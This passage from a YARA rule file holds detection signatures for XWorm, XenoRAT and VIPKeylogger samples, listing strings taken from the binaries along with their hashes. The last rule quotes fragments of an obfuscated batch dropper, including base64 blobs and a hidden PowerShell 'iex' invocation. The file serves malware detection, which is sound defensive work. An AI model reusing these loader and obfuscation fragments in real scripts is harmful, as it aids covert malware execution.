      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7272849f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7272849fb01ebbe8daed5264d778ed569f8ba632ea7b0f5f92f622819f8ef31a"
   strings:
      $s1 = "Tencent Game Downloader" fullword wide /* score: '19.00'*/
      $s2 = "pospos_build.exe" fullword wide /* score: '19.00'*/
      $s3 = "pospos_mn.exe" fullword wide /* score: '19.00'*/
      $s4 = "pospos_mn.exe|True|False" fullword wide /* score: '11.00'*/
      $s5 = "Jkxzmye.pdf" fullword wide /* score: '10.00'*/
      $s6 = "Jkxzmye.pdf|True|False" fullword wide /* score: '10.00'*/
      $s7 = "geqnwlrvosvlo" fullword wide /* score: '8.00'*/
      $s8 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule XenoRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file XenoRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc14bc97e9926353ea4953e44a12e673654b98bdcbc7820ae9ed48868c1f5af5"
   strings:
      $s1 = "xeno rat client.exe" fullword wide /* score: '24.00'*/
      $s2 = "Xeno_manager.exe" fullword wide /* score: '19.00'*/
      $s3 = "mutex_string" fullword ascii /* score: '15.00'*/
      $s4 = "<process>5__3" fullword ascii /* score: '15.00'*/
      $s5 = "<getdll>5__2" fullword ascii /* score: '14.00'*/
      $s6 = "/xeno_rat_client.DllHandler+<DllNodeHandler>d__3" fullword ascii /* score: '13.00'*/
      $s7 = "_EncryptionKey" fullword ascii /* score: '12.00'*/
      $s8 = "GetWindowsVersion" fullword ascii /* score: '12.00'*/
      $s9 = "/query /v /fo csv" fullword wide /* score: '12.00'*/
      $s10 = "                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>" fullword wide /* score: '12.00'*/
      $s11 = "xeno rat client" fullword wide /* score: '11.00'*/
      $s12 = "<tempXmlFile>5__2" fullword ascii /* score: '11.00'*/
      $s13 = "                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s14 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s15 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule VIPKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a09d6699 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a09d6699.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a09d6699c8aad5ef8e6cc60745ffa8764da18b41e92e3f02da1f45b70c74d695"
   strings:
      $s1 = "KZmf.exe" fullword wide /* score: '22.00'*/
      $s2 = "GetHabitsNotCompletedToday" fullword ascii /* score: '12.00'*/
      $s3 = "GetHabitCompletions" fullword ascii /* score: '12.00'*/
      $s4 = "get_CompletedDates" fullword ascii /* score: '12.00'*/
      $s5 = "<GetCompletedTodayCount>b__6_0" fullword ascii /* score: '12.00'*/
      $s6 = "<GetHabitCompletions>b__12_1" fullword ascii /* score: '12.00'*/
      $s7 = "<GetHabitsNotCompletedToday>b__14_0" fullword ascii /* score: '12.00'*/
      $s8 = "<GetHabitCompletions>b__12_0" fullword ascii /* score: '12.00'*/
      $s9 = "<GetTotalCompletions>b__10_0" fullword ascii /* score: '12.00'*/
      $s10 = "GetCompletedTodayCount" fullword ascii /* score: '12.00'*/
      $s11 = "GetHabitsCompletedToday" fullword ascii /* score: '12.00'*/
      $s12 = "<GetHabitsCompletedToday>b__13_0" fullword ascii /* score: '12.00'*/
      $s13 = "GetTodayCompletionPercentage" fullword ascii /* score: '12.00'*/
      $s14 = "GetTotalCompletions" fullword ascii /* score: '12.00'*/
      $s15 = "System.Windows.Forms.Automation" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__cc517fde {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cc517fde.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc517fde471895786ec1ed2d1c5b192849565d7c6725bcc19579613b8ad2d564"
   strings:
      $s1 = "ExecuteFullPipeline" fullword ascii /* score: '24.00'*/
      $s2 = "get_ExecutionTime" fullword ascii /* score: '21.00'*/
      $s3 = "set_ExecutionTime" fullword ascii /* score: '16.00'*/
      $s4 = "<ExecutionTime>k__BackingField" fullword ascii /* score: '16.00'*/
      $s5 = "gg.exe" fullword wide /* score: '16.00'*/
      $s6 = "AssemblyPipelineProcessor" fullword ascii /* score: '14.00'*/
      $s7 = "get_EncryptionIV" fullword ascii /* score: '14.00'*/
      $s8 = "<EncryptionKey>k__BackingField" fullword ascii /* score: '12.00'*/
      $s9 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s10 = "PipelineResult" fullword ascii /* score: '10.00'*/
      $s11 = "PipelineConfiguration" fullword ascii /* score: '10.00'*/
      $s12 = "get_Fixnmla" fullword ascii /* score: '9.00'*/
      $s13 = "set_EncryptionIV" fullword ascii /* score: '9.00'*/
      $s14 = "get_TimeoutMs" fullword ascii /* score: '9.00'*/
      $s15 = "<EncryptionIV>k__BackingField" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f5bb2c09 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f5bb2c09.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5bb2c09472d5b68f7b1bfae1eadfa4391d4524031497161a2483869300ee70e"
   strings:
      $s1 = "iFrA.exe" fullword wide /* score: '22.00'*/
      $s2 = "iFrA.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Export Complete" fullword wide /* score: '12.00'*/
      $s4 = "GenerateExportContent" fullword ascii /* score: '12.00'*/
      $s5 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s6 = "Analogous" fullword wide /* score: '11.00'*/
      $s7 = "ColorSchemeGenerator.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s8 = "Error exporting file: " fullword wide /* score: '10.00'*/
      $s9 = "get_SchemeType" fullword ascii /* score: '9.00'*/
      $s10 = "GetFileFilter" fullword ascii /* score: '9.00'*/
      $s11 = "GetColorHex" fullword ascii /* score: '9.00'*/
      $s12 = "* $>O]]9>5" fullword ascii /* score: '9.00'*/
      $s13 = "GenerateAnalogous" fullword ascii /* score: '9.00'*/
      $s14 = "{0} ({1}) - {2} colors" fullword wide /* score: '9.00'*/
      $s15 = "Export Color Scheme" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0a62f3c0 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0a62f3c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0a62f3c048ecc14916323e4678e64ccc327e122a061646eeae9acba634703572"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s3 = "dglT.exe" fullword wide /* score: '22.00'*/
      $s4 = "CommonDialog.Form1.resources" fullword ascii /* score: '15.00'*/
      $s5 = "BatchProcessing" fullword ascii /* score: '15.00'*/
      $s6 = "dglT.pdb" fullword ascii /* score: '14.00'*/
      $s7 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s8 = "\\test.jpg" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__49da1259 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_49da1259.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "49da12598beb3901e854a2c105e7e31d820db9b1f8becf581043fe4c30b1d589"
   strings:
      $s1 = "jOJm.exe" fullword wide /* score: '22.00'*/
      $s2 = "mailto:support@example.com" fullword wide /* score: '21.00'*/
      $s3 = "support@example.com" fullword wide /* score: '21.00'*/
      $s4 = "https://github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s5 = "github.com/example/numberbaseconverter" fullword wide /* score: '17.00'*/
      $s6 = "A simple and efficient number base converter that supports conversion between Binary (2), Octal (8), Decimal (10), and Hexadecim" wide /* score: '16.00'*/
      $s7 = "set_TargetBase" fullword ascii /* score: '14.00'*/
      $s8 = "get_TargetBase" fullword ascii /* score: '14.00'*/
      $s9 = "jOJm.pdb" fullword ascii /* score: '14.00'*/
      $s10 = "<TargetBase>k__BackingField" fullword ascii /* score: '14.00'*/
      $s11 = "targetBase" fullword ascii /* score: '14.00'*/
      $s12 = "{0:HH:mm:ss} - {1} ({2}) " fullword wide /* score: '12.00'*/
      $s13 = "GetBaseName" fullword ascii /* score: '9.00'*/
      $s14 = "GetSelectedBase" fullword ascii /* score: '9.00'*/
      $s15 = "get_SourceBase" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2e776ede {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2e776ede.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e776ede29053c0e90a6ce90cf97eefc9a5c8bb31c53e50b50c484d79add9301"
   strings:
      $s1 = "aVTL.exe" fullword wide /* score: '22.00'*/
      $s2 = "aVTL.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "scores.txt" fullword wide /* score: '14.00'*/
      $s4 = "paint.net 4.0.134" fullword ascii /* score: '10.00'*/
      $s5 = "get_PlayerName" fullword ascii /* score: '9.00'*/
      $s6 = "<GetAllScores>b__5_0" fullword ascii /* score: '9.00'*/
      $s7 = "<GetHighestScore>b__9_0" fullword ascii /* score: '9.00'*/
      $s8 = "<GetTopScores>b__4_1" fullword ascii /* score: '9.00'*/
      $s9 = "get_DateAchieved" fullword ascii /* score: '9.00'*/
      $s10 = "GetHighestScore" fullword ascii /* score: '9.00'*/
      $s11 = "GetScrambledWord" fullword ascii /* score: '9.00'*/
      $s12 = "get_SelectedDifficulty" fullword ascii /* score: '9.00'*/
      $s13 = "GetAllScores" fullword ascii /* score: '9.00'*/
      $s14 = "<GetTopScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s15 = "1iRCx/5o" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__12c5ca2e {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_12c5ca2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "12c5ca2e49197d68123a414657dd0cfba63ccfd3e388e9f23f9a646b5f36660f"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\DZuzrgeIqp\\src\\obj\\Debug\\XWsI.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s6 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s7 = "XWsI.exe" fullword wide /* score: '22.00'*/
      $s8 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s9 = "get_dateTime" fullword ascii /* score: '9.00'*/
      $s10 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s11 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s12 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s13 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s14 = "get_HowManyTable" fullword ascii /* score: '9.00'*/
      $s15 = "get_productManager" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__aa7b9795 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa7b9795.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa7b97952ef8157469dc1557f12114579847828d05b09ecfd04f95dd2cacc04d"
   strings:
      $s1 = "vgHt.exe" fullword wide /* score: '22.00'*/
      $s2 = "{0}. {1} - {2} pts ({3} attempts) [{4}] - {5}" fullword wide /* score: '19.00'*/
      $s3 = "scores.txt" fullword wide /* score: '14.00'*/
      $s4 = "GetTargetNumber" fullword ascii /* score: '14.00'*/
      $s5 = "vgHt.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "targetNumber" fullword ascii /* score: '14.00'*/
      $s7 = "lblAttempts" fullword wide /* score: '11.00'*/
      $s8 = "<Attempts>k__BackingField" fullword ascii /* score: '11.00'*/
      $s9 = "Attempts: {0}" fullword wide /* score: '11.00'*/
      $s10 = "Congratulations! You guessed it in {0} attempts!" fullword wide /* score: '11.00'*/
      $s11 = "Attempts:" fullword wide /* score: '11.00'*/
      $s12 = "get_PlayerName" fullword ascii /* score: '9.00'*/
      $s13 = "<GetHighScores>b__4_2" fullword ascii /* score: '9.00'*/
      $s14 = "gameLogic" fullword ascii /* score: '9.00'*/
      $s15 = "GameLogic" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d1e92086 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d1e92086.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d1e92086f5e4b2fb738ef995ab7fd47fcb939b6b047109a506da0b79b0b7ef22"
   strings:
      $s1 = "bbbbbb.exe" fullword wide /* score: '22.00'*/
      $s2 = "LINGO CHEAT.exe" fullword wide /* score: '19.00'*/
      $s3 = "LINGO X CHEAT.exe" fullword wide /* score: '19.00'*/
      $s4 = "bbbbbb.exe-=>True-=>False" fullword wide /* score: '14.00'*/
      $s5 = "LINGO X CHEAT.exe-=>True-=>False" fullword wide /* score: '11.00'*/
      $s6 = "GetTheResource" fullword ascii /* score: '9.00'*/
      $s7 = "eYEeyao" fullword ascii /* score: '9.00'*/
      $s8 = "%Current%" fullword wide /* score: '8.00'*/
      $s9 = "lcqnhvp" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule VIPKeylogger_signature_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature).iso"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f409ec6f04457e094ec5bc962c8ec8ee489771f8a4a2db1e35bbf9d71987c715"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "PO_2415.EXE" fullword ascii /* score: '16.00'*/
      $s4 = "PO_2415.exe" fullword wide /* score: '16.00'*/
      $s5 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s6 = "aaadddeeee" ascii /* score: '8.00'*/
      $s7 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s8 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x0000 and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__5544495b {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_5544495b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5544495b61b2d08a7f18ed0a50b51d90ab3be934ba77c7990a7cc046066aa13f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "571f44616f092f3fc15f263d26092ec17295ccd3ad04c27b97d416428bb74fc8"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__2d6c2c08 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_2d6c2c08.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2d6c2c08be512e7529f3bd3b7bd655bec86ee2069305ed8898633c95c368b36f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__3c6b5d56 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_3c6b5d56.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c6b5d56178090b879a919673172017317445723b70029bfed7299e084377b84"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__d8e909fe {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_d8e909fe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d8e909fe7d8e99363fdaf971c3f1df42cadf3e8e58bce28c213a9220fc5ce3b9"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__dea6891b {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_dea6891b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dea6891bec1e296c8ce626d91b760172f929b35161a73955a8f4fd297638b827"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "* [3LIo" fullword ascii /* score: '9.00'*/
      $s5 = "aaadddeeee" ascii /* score: '8.00'*/
      $s6 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s7 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__f91dca81 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_f91dca81.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f91dca81db5d57d9b1f74435d6cf1fd3db717cef2b84cbb5869cd95b544340c4"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "Cheadle Hulme1" fullword ascii /* score: '9.00'*/
      $s5 = "aaadddeeee" ascii /* score: '8.00'*/
      $s6 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s7 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__b34f154ec913d2d2c435cbd644e91687_imphash__fe574955 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_b34f154ec913d2d2c435cbd644e91687(imphash)_fe574955.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "fe574955e7f535c14ad316665bf8a9fa27c5603249f86d617641c12bdcb8363b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "douce wheerikins.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.04</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "aaadddeeee" ascii /* score: '8.00'*/
      $s5 = "sildebensmnstres" fullword wide /* score: '8.00'*/
      $s6 = "frekvensgangen" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__4 {
   meta:
      description = "_subset_batch - file XWorm(signature).iso"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3dbcf23526eae93f2ae1d624eb90f0264f3703146b1b93e5b42d20ae3491d7ec"
   strings:
      $x1 = "3.02a06 -J -joliet-long -jcharset UTF-8 -l -r -V 14_Bestellung.pdf -o C:\\Users\\shaw\\Desktop\\BAT\\output\\ISO_OUT\\Document_2" ascii /* score: '32.00'*/
      $x2 = "3.02a06 -J -joliet-long -jcharset UTF-8 -l -r -V 14_Bestellung.pdf -o C:\\Users\\shaw\\Desktop\\BAT\\output\\ISO_OUT\\Document_2" ascii /* score: '32.00'*/
      $s3 = ":: KA4OWfi02i0Cob9Xtd6L92VibmgeVdCPEy7pod82GmmoAzBs+s78ea/B6De+OAvkjN1Q4DGKNeGUjMSiyzePAIMVupicFDsXaC+H7xewpi1T9QphFWfKEncpJMa17" ascii /* score: '25.00'*/
      $s4 = "6319303_1_202503601353_7383298_PRINTER2.iso C:\\Users\\shaw\\Desktop\\BAT\\output\\ISO_IN" fullword ascii /* score: '24.00'*/
      $s5 = "!kztuwsrxqexrxrz! \"%yuruwkry%j%yuruwkry%i%yuruwkry%d%yuruwkry%m%yuruwkry%k%yuruwkry%u%yuruwkry%u%yuruwkry%s%yuruwkry%v%yuruwkry" ascii /* score: '16.00'*/
      $s6 = "MTbfACD0CYOD2bNXJPMgLLK7lENbW3onoNglMXBLk6hrQfye05tHQlrj5VbE/aHqEiaAkO58+UG/52aSLLz5spYAD4sHP46LfqfWEaaZ3beoCYwljEMkNpFBkb/Y1x0P" ascii /* score: '16.00'*/
      $s7 = "MiMqfY7LykCy1QoJnvdTUm41UsYDSp2ZHCLAJopOZEr4RKxxA2B8D1DKTJBrQA+4BbbEBJcPpW9JDupAgOdkIkVi3MffrKswiebCbvyPzvzlOGCxBWBLeDTYgF79PB56" ascii /* score: '16.00'*/
      $s8 = "haLFxu/PTFcelDVieK4YaR+zA4qHJthC4yZHPMpjHxI5w5WUwkm3AFC1BWy+0/Z3RhdzCJgajPSeoM/l3GC8TpTjULOgYdTeOa5XSw5FKHkkLF73gQW2p7MWBsWopShg" ascii /* score: '16.00'*/
      $s9 = "m%yuruwkry%h%yuruwkry%e=-nop -w h -c \"\"iex([Te\"" fullword ascii /* score: '16.00'*/
      $s10 = "7G7aeTf4aIi7R295SNX1Pf1cPvhskniwEHl9/zu4lGzWzfoC6OUbPYswe5oeefnV99p2b/fjmnrat/VR58X762aFsPXjxRYYVwlpWDHZuA3sfY59Db4XXguqxbZw0QzM" ascii /* score: '16.00'*/
      $s11 = "ZMxKiKJjaqHwzo5qQ2sWAhFn49gQNJaFJM6s69sbzGKmaJ6aiEI+xeL1UMPE8jri0MrDM9AShoKdUrSKdn1EtlsSiu6UcGruq9bhmT1KBfXik15LoGbmHt+P7li7u2xV" ascii /* score: '16.00'*/
